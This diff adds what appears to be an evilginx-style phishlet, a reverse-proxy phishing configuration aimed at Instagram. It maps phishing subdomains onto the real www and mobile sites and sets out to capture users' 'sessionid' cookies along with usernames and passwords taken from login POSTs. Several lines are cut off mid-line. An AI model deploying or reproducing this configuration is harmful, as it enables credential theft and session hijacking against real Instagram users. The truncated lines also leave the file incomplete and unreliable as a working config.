@@ -1,0 +1,19 @@
+author: '@prrrrinncee'
+min_ver: '2.2.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com', session: true,$
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'instagram.com', session: true, is_$
+sub_filters:
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com'$
+  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', se$
+  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', se$
+auth_tokens:
+  - domain: '.instagram.com'
+    keys: ['sessionid','.*,regexp']
+credentials:
+  username:
+    key: 'user'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'pass'
